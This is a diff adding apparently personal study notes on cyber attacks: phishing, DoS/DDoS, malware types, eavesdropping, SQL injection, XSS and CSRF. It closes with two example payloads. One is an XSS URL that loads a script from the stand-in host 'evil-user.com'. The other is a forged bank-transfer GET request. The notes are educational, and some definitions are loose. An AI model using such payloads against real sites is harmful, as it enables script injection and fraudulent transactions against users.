@@ -1,0 +1,64 @@
+A cyber attack is an attempt to exploit a vulnerability in a system, device or network with the intent to steal information or gain unauthorised access.
+Nobody is necessarily safe from a cyber attack, though certain things like military bases are at much higher risk of them.
+The severity of an attack will likely vary based on the attacker's motivations, whether they're financial, political, government-related, gang-related or
+for espionage.
+
+Classifications:
+	Social engineering - Psychological exploitation of a person to make them do something to breach confidentiality.
+	Web application attacks - SQL injections, cross-site scripting, cross-site request forging, eavesdropping.
+	System intrusion -  Attacks using malware and/or hacking
+	Misc. errors - Unintentional actions compromising security. (PC left unattended)
+	Privilege misuse - Issues caused by unapproved or malicious usage of elevated privileges given legitimately.
+	Lost & stolen assets - Attacks where information went missing, unintentionally or maliciously.
+	Denial of service - Attacks where the availability of a network/system is compromised. Includes both network & application layer attacks.
+
+Social engineering:	
+	Phishing - General term?
+	Spear-phishing - Highly targeted, the scammer researches the victim before using specific ways to target them.
+			      More and more common because of how much info people share online. Someone could pretend to be your co-worker and use
+			      personal information about them in an effort to trick you. Multi-stage (studying victim, studing habits, studying friends, etc)
+	Vishing - "Voice phishing", over the phone scams.
+	Online phishing - Fake websites ("amazoon.com") Some may be very well hidden. ("google.com.uk" over ".co.uk" maybe)
+			       Preventable by paying attention, which is why they work so well.
+	
+Phishing is so popular because people are the weakest link in any system. It doesn't matter what crazy security you have if an idiot is in charge of it
+and someone can exploit them. It's very easy and very cheap to phish. Mitigating phishing can be attempted via user security awareness training,
+using MFA, not oversharing info on social media, keeping systems up-to-date and using spam filters on emails/phones. Spam filters aren't 100%
+accurate but it's still better to have them than not to.
+
+DoS and DDoS attacks (all of these are followed by the word "attack"):
+	SYN Flood  - Repeated SYN (connection request [client hello]) packets, overloading the server. Basically leaves the server hanging, expecting
+		           some more data. Opens many sessions, which then causes the overload.
+	Smurf - Repeated ICMP (just data?) packets using the spoofed IP address of a victim. (Research this?)
+	Botnets - "Zombie" devices, often IoT devices nowadays, hacked and used as part of a DDoS attack.
+	Ping of Death - Malicious data until the system crashes.
+
+DoS is one IP? DDoS is many. Could be millions.
+DoS are often mitigated by rate-limting IP addresses. If an IP sends too much data, it assumes a DoS attack and blocks it.
+DDoS is very hard to mitigate because you'd probably be blocking actual users of the service who became part of the DDoS.
+
+
+A virus is a computer program that affects or INfects a computer negatively, changing the way it works without the user's knowledge or permission.
+Viruses may then spread, hence the name.
+	Worm - Spreads repeatedly across memory or a network, using many resources.
+	Trojan horse - Poses as a legitimate program but has a malicious payload. Doesn't replicate to other computers.
+	Spyware -  Secretly gathers information, like a keylogger for example. By design, you wouldn't know it was there.
+	Ransomware - Encrypts data until a fee has been paid. Even then you have to trust that they'll even send you the decryptor.
+			  May threaten to delete or release the data; whichever they think would do more damage to you/the company.
+
+
+Eavesdropping can be passive or active.
+	Passive - Attacker is just listening to communications and not modifying them.
+	Active - Attacker is listening and then messing with the communications. Modifying, deleting, sending their own messages, etc.
+
+SQL injections are where users could enter SQL code into site inputs (forms) which would then be executed. This is a result of poor programming,
+where SQL statements are not prepared/properly escaped before being used. A user could enter an SQL escape character and then follow that with an SQL command. The site would then recognise it as valid SQL.
+
+Cross-site scripting (XSS) is where a user can distort a URL to perform unintended actions. For example, this site uses GET requests for "message":
+https://my-site.com/messages?msg="Hello!"
+But a malicious user could possibly use that to inject malicious code, such as:
+https://my-site.com/messages?msg=<script src=https://evil-user.com/virus.js></script>
+
+CSRF uses maliciously formed links that will perform actions when clicked. For example, they make a request link that would transfer $1000 to them.
+They send this to a user who is logged in. The user clicks this, and then because that is actually valid, the transfer would occur. 
+GET http://bank.com/transfer?acct=Hacker&amount=1000 HTTP/1.1
